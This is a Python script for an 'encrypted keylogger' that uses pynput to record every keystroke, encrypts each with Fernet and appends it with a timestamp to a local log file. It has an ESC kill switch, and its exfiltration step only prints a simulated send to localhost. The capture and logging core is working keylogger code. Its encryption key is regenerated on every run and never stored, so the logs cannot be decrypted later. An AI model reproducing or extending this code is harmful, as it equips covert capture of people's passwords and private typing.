from pynput import keyboard
from cryptography.fernet import Fernet
import base64
import os
import datetime

# === CONFIGURATIONS ===

# Kill switch key (e.g., press ESC to stop)
KILL_KEY = keyboard.Key.esc

# Encryption key (for demo purpose, regenerate or store securely)
KEY = Fernet.generate_key()
fernet = Fernet(KEY)

# Log file
LOG_FILE = "logs/encrypted_logs.txt"

# Ensure logs directory exists
os.makedirs("logs", exist_ok=True)

# === KEYLOGGER CORE ===

def encrypt_data(data):
    return fernet.encrypt(data.encode()).decode()

def write_log(encrypted_data):
    with open(LOG_FILE, "a") as f:
        timestamp = datetime.datetime.now().isoformat()
        log_entry = f"[{timestamp}] {encrypted_data}\n"
        f.write(log_entry)
        simulate_exfiltration(encrypted_data)

def simulate_exfiltration(encrypted_data):
    print(f"[SIMULATED] Sending to http://localhost:5000: {encrypted_data}")

def on_press(key):
    try:
        if key == KILL_KEY:
            print("[!] Kill switch activated. Exiting.")
            return False  # Stop listener
        k = key.char if hasattr(key, 'char') else str(key)
        encrypted = encrypt_data(k)
        write_log(encrypted)
        print(f"[+] Keystroke encrypted and logged.")
    except Exception as e:
        print(f"[!] Error: {e}")

# === MAIN ===

if __name__ == "__main__":
    print("[*] Starting encrypted keylogger...")
    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()
